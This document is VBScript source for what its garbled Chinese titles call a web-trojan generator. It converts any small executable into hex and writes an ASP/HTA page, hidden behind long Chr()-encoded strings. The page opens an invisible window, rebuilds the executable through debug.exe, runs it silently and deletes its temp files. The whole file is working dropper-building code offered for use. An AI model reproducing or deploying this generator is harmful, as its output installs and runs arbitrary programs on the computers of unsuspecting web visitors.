   On Error Resume Next

   Set fs=CreateObject("Scripting.FileSystemObject")
   Set wshell=CreateObject("Wscript.Shell")

   strFile=fs.GetTempName
   strdir=fs.GetSpecialFolder(2)&Chr(92)&strFile

   '******************* Part 1 Start  *********************
   '*Changes the exe file into the hex form and Save in a temp file.

   '***************
   '*Chg into WORD
   '*
   Function ToWD(arg)
       arg_h=Hex(AscW(arg))
       init=String(4-Len(arg_h),Chr(48))&arg_h
       init=Right(init,2)&Chr(32)&Left(init,2)
       ToWD=init
   End Function

   '***************
   '*Input box
   '*
   p=inputbox("ÇëÊäÈë¿ÉÖ´ÐÐÎÄ¼þµÄÕýÈ·Â·¾¶"&vbCrlf&"Àý:c:\windows\notepad.exe","ObjectÂ©¶´ÍøÒ³Ä¾ÂíÉú³ÉÆ÷")
   q=inputbox("ÇëÊäÈëÒª±£´æµÄÍøÒ³µÄÕýÈ·Â·¾¶"&vbCrlf&"Àý:d:\tools\index.asp","ObjectÂ©¶´ÍøÒ³Ä¾ÂíÉú³ÉÆ÷")

   Set f=fs.GetFile(p)
   IF f.Size>65279 THEN
       MSGBOX "ERROR :" & Chr(13) & "    The EXE File you are opening is not able to load. It's too large(more than 65,279 bytes) OR it doesn't exist." &chr(13) & Chr(13) & "    Program will close...",64,"ERROR"
       WSCRIPT.QUIT
   END IF
   Set a_0=f.OpenAsTextStream(1,-1)
   Set a_1=f.OpenAsTextStream(1,-1)
   Set a_2=f.OpenAsTextStream(1,0)

   j_0=a_1.ReadAll
   j_1=a_2.ReadAll
   k=Len(j_0)
   o=k Mod 2

   Set b=fs.CreateTextFile(strdir,1)

   Sub Main1()
       For i=1 To k
           v=ToWD(a_0.Read(1))
           b.Write chr(32)&v
       Next
   End Sub

   If o=1 Then
       Main1()
       str_last=Ucase(Hex(Asc(Right(j_1,1))))
       If Len(str_last)=1 Then
           str_last=Chr(48)&str_last
       End If
       b.Write Chr(32)&str_last
   Else
       Main1()
   End If

   b.Close
   Set a_2=Nothing
   Set a_1=Nothing
   Set a_0=Nothing
   Set f=Nothing
   '********************* Part 1 End *********************


   '******************** Part 2 Start ********************
   '*Creates a asp file from the temp file in which writed hex form.

   str_1=Chr(60)&Chr(37)&Chr(82)&Chr(101)&Chr(115)&Chr(112)&Chr(111)&Chr(110)&Chr(115)&Chr(101)&Chr(46)&Chr(67)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(61)&Chr(34)&Chr(65)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(47)&Chr(72)&Chr(116)&Chr(97)&Chr(34)&Chr(37)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(104)&Chr(116)&Chr(97)&Chr(58)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(104)&Chr(101)&Chr(105)&Chr(103)&Chr(104)&Chr(116)&Chr(61)&Chr(34)&Chr(48)&Chr(34)&Chr(32)&Chr(119)&Chr(105)&Chr(100)&Chr(116)&Chr(104)&Chr(61)&Chr(34)&Chr(48)&Chr(34)&Chr(32)&Chr(99)&Chr(97)&Chr(112)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(61)&Chr(34)&Chr(110)&Chr(111)&Chr(34)&Chr(32)&Chr(98)&Chr(111)&Chr(114)&Chr(100)&Chr(101)&Chr(114)&Chr(61)&Chr(34)&Chr(110)&Chr(111)&Chr(110)&Chr(101)&Chr(34)&Chr(32)&Chr(115)&Chr(104)&Chr(111)&Chr(119)&Chr(105)&Chr(110)&Chr(116)&Chr(97)&Chr(115)&Chr(107)&Chr(98)&Chr(97)&Chr(114)&Chr(61)&Chr(34)&Chr(110)&Chr(111)&Chr(34)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(104)&Chr(116)&Chr(109)&Chr(108)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(104)&Chr(101)&Chr(97)&Chr(100)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(109)&Chr(101)&Chr(116)&Chr(97)&Chr(32)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(61)&Chr(34)&Chr(71)&Chr(101)&Chr(110)&Chr(101)&Chr(114)&Chr(97)&Chr(116)&Chr(111)&Chr(114)&Chr(34)&Chr(32)&Chr(99)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(61)&Chr(34)&Chr(77)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)&Chr(102)&Chr(116)&Chr(32)&Chr(78)&Chr(111)&Chr(116)&Chr(101)&Chr(112)&Chr(97)&Chr(100)&Chr(34)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(116)&Chr(105)&Chr(116)&Chr(108)&Chr(101)&Chr(62)&Chr(-19540)&Chr(-17166)&Chr(-19035)&Chr(-12808)&Chr(-11597)&Chr(-15170)&Chr(-15635)&Chr(-23640)&Chr(-11091)&Chr(-19276)&Chr(58)&Chr(32)&Chr(99)&Chr(104)&Chr(105)&Chr(110)&Chr(-23639)&Chr(60)&Chr(47)&Chr(116)&Chr(105)&Chr(116)&Chr(108)&Chr(101)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(109)&Chr(101)&Chr(116)&Chr(97)&Chr(32)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(61)&Chr(34)&Chr(86)&Chr(101)&Chr(114)&Chr(115)&Chr(105)&Chr(111)&Chr(110)&Chr(34)&Chr(32)&Chr(99)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(61)&Chr(34)&Chr(49)&Chr(46)&Chr(51)&Chr(46)&Chr(49)&Chr(48)&Chr(46)&Chr(49)&Chr(51)&Chr(34)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(109)&Chr(101)&Chr(116)&Chr(97)&Chr(32)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(61)&Chr(34)&Chr(65)&Chr(117)&Chr(116)&Chr(104)&Chr(111)&Chr(114)&Chr(34)&Chr(32)&Chr(99)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(32)&Chr(61)&Chr(32)&Chr(34)&Chr(99)&Chr(104)&Chr(105)&Chr(110)&Chr(34)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(115)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(32)&Chr(108)&Chr(97)&Chr(110)&Chr(103)&Chr(117)&Chr(97)&Chr(103)&Chr(101)&Chr(61)&Chr(34)&Chr(74)&Chr(97)&Chr(118)&Chr(97)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(34)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(33)&Chr(45)&Chr(45)&Chr(13)&Chr(10)&Chr(119)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(46)&Chr(109)&Chr(111)&Chr(118)&Chr(101)&Chr(84)&Chr(111)&Chr(40)&Chr(48)&Chr(44)&Chr(48)&Chr(41)&Chr(59)&Chr(13)&Chr(10)&Chr(119)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(46)&Chr(114)&Chr(101)&Chr(115)&Chr(105)&Chr(122)&Chr(101)&Chr(84)&Chr(111)&Chr(40)&Chr(48)&Chr(44)&Chr(48)&Chr(41)&Chr(59)&Chr(13)&Chr(10)&Chr(47)&Chr(47)&Chr(45)&Chr(45)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(47)&Chr(115)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(47)&Chr(104)&Chr(101)&Chr(97)&Chr(100)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(98)&Chr(111)&Chr(100)&Chr(121)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(115)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(32)&Chr(108)&Chr(97)&Chr(110)&Chr(103)&Chr(117)&Chr(97)&Chr(103)&Chr(101)&Chr(61)&Chr(34)&Chr(86)&Chr(66)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(34)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(33)&Chr(45)&Chr(45)&Chr(13)&Chr(10)&Chr(13)&Chr(10)&Chr(79)&Chr(110)&Chr(32)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(82)&Chr(101)&Chr(115)&Chr(117)&Chr(109)&Chr(101)&Chr(32)&Chr(78)&Chr(101)&Chr(120)&Chr(116)&Chr(13)&Chr(10)&Chr(13)&Chr(10)&Chr(39)&Chr(-22096)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22092)&Chr(13)&Chr(10)&Chr(39)&Chr(-22106)&Chr(-18180)&Chr(-18720)&Chr(-15170)&Chr(-15635)&Chr(-14099)&Chr(-17154)&Chr(-24158)&Chr(-18012)&Chr(-16673)&Chr(-18493)&Chr(-12598)&Chr(32)&Chr(-15170)&Chr(-15635)&Chr(-18981)&Chr(-17926)&Chr(32)&Chr(32)&Chr(32)&Chr(-22106)&Chr(13)&Chr(10)&Chr(39)&Chr(-22106)&Chr(32)&Chr(32)&Chr(-20034)&Chr(-10818)&Chr(-15425)&Chr(-13076)&Chr(-18180)&Chr(-12094)&Chr(32)&Chr(32)&Chr(32)&Chr(-20257)&Chr(-10511)&Chr(-11046)&Chr(-12321)&Chr(-16926)&Chr(-19216)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(-22106)&Chr(13)&Chr(10)&Chr(39)&Chr(-22106)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(58)&Chr(47)&Chr(47)&Chr(119)&Chr(119)&Chr(119)&Chr(46)&Chr(109)&Chr(109)&Chr(98)&Chr(101)&Chr(115)&Chr(116)&Chr(46)&Chr(99)&Chr(111)&Chr(109)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(-22106)&Chr(13)&Chr(10)&Chr(39)&Chr(-22088)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22108)&Chr(-22084)&Chr(13)&Chr(10)&Chr(100)&Chr(105)&Chr(109)&Chr(32)&Chr(87)&Chr(83)&Chr(72)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(44)&Chr(102)&Chr(115)&Chr(44)&Chr(97)&Chr(13)&Chr(10)&Chr(100)&Chr(105)&Chr(109)&Chr(32)&Chr(102)&Chr(110)&Chr(95)&Chr(116)&Chr(109)&Chr(112)&Chr(44)&Chr(102)&Chr(110)&Chr(95)&Chr(99)&Chr(111)&Chr(109)&Chr(44)&Chr(102)&Chr(110)&Chr(95)&Chr(101)&Chr(120)&Chr(101)&Chr(13)&Chr(10)&Chr(83)&Chr(101)&Chr(116)&Chr(32)&Chr(87)&Chr(83)&Chr(72)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(61)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116)&Chr(40)&Chr(34)&Chr(87)&Chr(115)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(34)&Chr(41)&Chr(13)&Chr(10)&Chr(83)&Chr(101)&Chr(116)&Chr(32)&Chr(102)&Chr(115)&Chr(61)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116)&Chr(40)&Chr(34)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(105)&Chr(110)&Chr(103)&Chr(46)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116)&Chr(34)&Chr(41)&Chr(13)&Chr(10)&Chr(102)&Chr(110)&Chr(95)&Chr(116)&Chr(109)&Chr(112)&Chr(61)&Chr(102)&Chr(115)&Chr(46)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(112)&Chr(101)&Chr(99)&Chr(105)&Chr(97)&Chr(108)&Chr(70)&Chr(111)&Chr(108)&Chr(100)&Chr(101)&Chr(114)&Chr(40)&Chr(50)&Chr(41)&Chr(38)&Chr(67)&Chr(104)&Chr(114)&Chr(40)&Chr(57)&Chr(50)&Chr(41)&Chr(38)&Chr(82)&Chr(105)&Chr(103)&Chr(104)&Chr(116)&Chr(40)&Chr(102)&Chr(115)&Chr(46)&Chr(71)&Chr(101)&Chr(116)&Chr(84)&Chr(101)&Chr(109)&Chr(112)&Chr(78)&Chr(97)&Chr(109)&Chr(101)&Chr(44)&Chr(56)&Chr(41)&Chr(13)&Chr(10)&Chr(102)&Chr(110)&Chr(95)&Chr(99)&Chr(111)&Chr(109)&Chr(61)&Chr(82)&Chr(101)&Chr(112)&Chr(108)&Chr(97)&Chr(99)&Chr(101)&Chr(40)&Chr(102)&Chr(110)&Chr(95)&Chr(116)&Chr(109)&Chr(112)&Chr(44)&Chr(34)&Chr(46)&Chr(116)&Chr(109)&Chr(112)&Chr(34)&Chr(44)&Chr(34)&Chr(46)&Chr(99)&Chr(111)&Chr(109)&Chr(34)&Chr(44)&Chr(49)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(49)&Chr(41)&Chr(13)&Chr(10)&Chr(102)&Chr(110)&Chr(95)&Chr(101)&Chr(120)&Chr(101)&Chr(61)&Chr(82)&Chr(101)&Chr(112)&Chr(108)&Chr(97)&Chr(99)&Chr(101)&Chr(40)&Chr(102)&Chr(110)&Chr(95)&Chr(116)&Chr(109)&Chr(112)&Chr(44)&Chr(34)&Chr(46)&Chr(116)&Chr(109)&Chr(112)&Chr(34)&Chr(44)&Chr(34)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&Chr(34)&Chr(44)&Chr(49)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(49)&Chr(41)&Chr(13)&Chr(10)&Chr(13)&Chr(10)&Chr(83)&Chr(101)&Chr(116)&Chr(32)&Chr(97)&Chr(61)&Chr(102)&Chr(115)&Chr(46)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(84)&Chr(101)&Chr(120)&Chr(116)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(40)&Chr(102)&Chr(110)&Chr(95)&Chr(116)&Chr(109)&Chr(112)&Chr(44)&Chr(49)&Chr(41)&vbCrLf

   str_2=Chr(97)&Chr(46)&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(101)&Chr(32)&Chr(34)&Chr(110)&Chr(32)&Chr(34)&Chr(38)&Chr(102)&Chr(110)&Chr(95)&Chr(99)&Chr(111)&Chr(109)&Chr(38)&Chr(118)&Chr(98)&Chr(67)&Chr(114)&Chr(76)&Chr(102)&Chr(13)&Chr(10)&Chr(97)&Chr(46)&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(101)&Chr(32)&Chr(34)&Chr(119)&Chr(34)&Chr(38)&Chr(118)&Chr(98)&Chr(67)&Chr(114)&Chr(76)&Chr(102)&Chr(13)&Chr(10)&Chr(97)&Chr(46)&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(101)&Chr(32)&Chr(34)&Chr(113)&Chr(34)&Chr(38)&Chr(118)&Chr(98)&Chr(67)&Chr(114)&Chr(76)&Chr(102)&Chr(13)&Chr(10)&Chr(97)&Chr(46)&Chr(67)&Chr(108)&Chr(111)&Chr(115)&Chr(101)&Chr(13)&Chr(10)&Chr(87)&Chr(83)&Chr(72)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(46)&Chr(82)&Chr(117)&Chr(110)&Chr(32)&Chr(34)&Chr(99)&Chr(111)&Chr(109)&Chr(109)&Chr(97)&Chr(110)&Chr(100)&Chr(46)&Chr(99)&Chr(111)&Chr(109)&Chr(32)&Chr(47)&Chr(99)&Chr(32)&Chr(100)&Chr(101)&Chr(98)&Chr(117)&Chr(103)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&Chr(60)&Chr(34)&Chr(38)&Chr(102)&Chr(110)&Chr(95)&Chr(116)&Chr(109)&Chr(112)&Chr(44)&Chr(48)&Chr(44)&Chr(49)&Chr(13)&Chr(10)&Chr(87)&Chr(83)&Chr(72)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(46)&Chr(82)&Chr(117)&Chr(110)&Chr(32)&Chr(34)&Chr(99)&Chr(109)&Chr(100)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&Chr(32)&Chr(47)&Chr(99)&Chr(32)&Chr(100)&Chr(101)&Chr(98)&Chr(117)&Chr(103)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&Chr(60)&Chr(34)&Chr(38)&Chr(102)&Chr(110)&Chr(95)&Chr(116)&Chr(109)&Chr(112)&Chr(44)&Chr(48)&Chr(44)&Chr(49)&Chr(13)&Chr(10)&Chr(13)&Chr(10)&Chr(68)&Chr(111)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(73)&Chr(102)&Chr(32)&Chr(102)&Chr(115)&Chr(46)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(69)&Chr(120)&Chr(105)&Chr(115)&Chr(116)&Chr(115)&Chr(40)&Chr(102)&Chr(110)&Chr(95)&Chr(99)&Chr(111)&Chr(109)&Chr(41)&Chr(61)&Chr(84)&Chr(114)&Chr(117)&Chr(101)&Chr(32)&Chr(84)&Chr(104)&Chr(101)&Chr(110)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(67)&Chr(104)&Chr(103)&Chr(95)&Chr(82)&Chr(117)&Chr(110)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(69)&Chr(120)&Chr(105)&Chr(116)&Chr(32)&Chr(68)&Chr(111)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(69)&Chr(110)&Chr(100)&Chr(32)&Chr(73)&Chr(102)&Chr(32)&Chr(32)&Chr(32)&Chr(13)&Chr(10)&Chr(76)&Chr(111)&Chr(111)&Chr(112)&Chr(13)&Chr(10)&Chr(13)&Chr(10)&Chr(83)&Chr(117)&Chr(98)&Chr(32)&Chr(67)&Chr(104)&Chr(103)&Chr(95)&Chr(82)&Chr(117)&Chr(110)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(102)&Chr(115)&Chr(46)&Chr(67)&Chr(111)&Chr(112)&Chr(121)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(102)&Chr(110)&Chr(95)&Chr(99)&Chr(111)&Chr(109)&Chr(44)&Chr(102)&Chr(110)&Chr(95)&Chr(101)&Chr(120)&Chr(101)&Chr(44)&Chr(49)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(87)&Chr(83)&Chr(72)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(46)&Chr(82)&Chr(117)&Chr(110)&Chr(32)&Chr(102)&Chr(110)&Chr(95)&Chr(101)&Chr(120)&Chr(101)&Chr(13)&Chr(10)&Chr(69)&Chr(110)&Chr(100)&Chr(32)&Chr(83)&Chr(117)&Chr(98)&Chr(13)&Chr(10)&Chr(13)&Chr(10)&Chr(102)&Chr(115)&Chr(46)&Chr(68)&Chr(101)&Chr(108)&Chr(101)&Chr(116)&Chr(101)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(102)&Chr(110)&Chr(95)&Chr(116)&Chr(109)&Chr(112)&Chr(44)&Chr(49)&Chr(13)&Chr(10)&Chr(102)&Chr(115)&Chr(46)&Chr(68)&Chr(101)&Chr(108)&Chr(101)&Chr(116)&Chr(101)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(102)&Chr(110)&Chr(95)&Chr(99)&Chr(111)&Chr(109)&Chr(44)&Chr(49)&Chr(13)&Chr(10)&Chr(83)&Chr(101)&Chr(116)&Chr(32)&Chr(102)&Chr(115)&Chr(61)&Chr(78)&Chr(111)&Chr(116)&Chr(104)&Chr(105)&Chr(110)&Chr(103)&Chr(13)&Chr(10)&Chr(83)&Chr(101)&Chr(116)&Chr(32)&Chr(87)&Chr(83)&Chr(72)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(61)&Chr(78)&Chr(111)&Chr(116)&Chr(104)&Chr(105)&Chr(110)&Chr(103)&Chr(13)&Chr(10)&Chr(13)&Chr(10)&Chr(39)&Chr(32)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(13)&Chr(10)&Chr(39)&Chr(32)&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(116)&Chr(101)&Chr(110)&Chr(32)&Chr(32)&Chr(32)&Chr(66)&Chr(121)&Chr(32)&Chr(32)&Chr(32)&Chr(99)&Chr(104)&Chr(105)&Chr(110)&Chr(32)&Chr(32)

   str_3=Chr(13)&Chr(10)&Chr(39)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(126)&Chr(126)&Chr(126)&Chr(126)&Chr(13)&Chr(10)&Chr(39)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(67)&Chr(111)&Chr(112)&Chr(121)&Chr(82)&Chr(105)&Chr(103)&Chr(104)&Chr(116)&Chr(40)&Chr(67)&Chr(41)&Chr(32)&Chr(65)&Chr(108)&Chr(108)&Chr(32)&Chr(82)&Chr(105)&Chr(103)&Chr(104)&Chr(116)&Chr(115)&Chr(32)&Chr(82)&Chr(101)&Chr(115)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(100)&Chr(13)&Chr(10)&Chr(39)&Chr(32)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(45)&Chr(13)&Chr(10)&Chr(119)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(46)&Chr(99)&Chr(108)&Chr(111)&Chr(115)&Chr(101)&Chr(13)&Chr(10)&Chr(47)&Chr(47)&Chr(45)&Chr(45)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(47)&Chr(115)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(47)&Chr(98)&Chr(111)&Chr(100)&Chr(121)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(47)&Chr(104)&Chr(116)&Chr(109)&Chr(108)&Chr(62)&Chr(13)&Chr(10)&vbCrLf


   Set f1=fs.GetFile(strdir)
   Set a_0=f1.OpenAsTextStream(1,0)
   Set a_1=f1.OpenASTextStream(1,0)
   set b=fs.CreateTextFile(q,1)
   fsize=f1.Size/3
   s1="a.Write"&Chr(32)&Chr(34)
   s2=Chr(34)&chr(38)&chr(118)&chr(98)&chr(67)&chr(114)&chr(76)&chr(102)&vbCrlf
   s3=fsize mod 16
   s4=fsize\16
   k2=a_0.ReadAll
   If s3=0 Then
       b.Write str_1
       main2()
       b.Write s1 & "rcx" & s2
       b.Write s1 & hex(fsize) & s2
       b.Write str_2
       b.Write Time&Chr(32)&Right(Date,Len(Date)-2)
       b.Write str_3
   Else
       b.Write str_1
       main2()
       g=hex(256+s4*16)
       x=right(k2,3*s3)
       b.Write s1 & "e"&g&x & s2
       b.Write s1 & "rcx" & s2
       b.Write s1 & hex(fsize) &s2
       b.Write str_2
       b.Write Time&Chr(32)&Right(Date,Len(Date)-2)
       b.Write str_3
   End If

   Sub main2()
   For i=1 to s4
       k=a_1.Read(48)
       w=Hex((i-1)*16+256)
       b.Write s1 & "e"&w
       For j=1 To 16
           t=Ucase(Right(Right(Left(k,j*3),3),2))
           b.Write Chr(32)&t
       Next
       b.Write s2
   Next
   End Sub

   b.Close

   '********************* Part 2 End *********************
   Set wshell=Nothing
   Set fs=Nothing
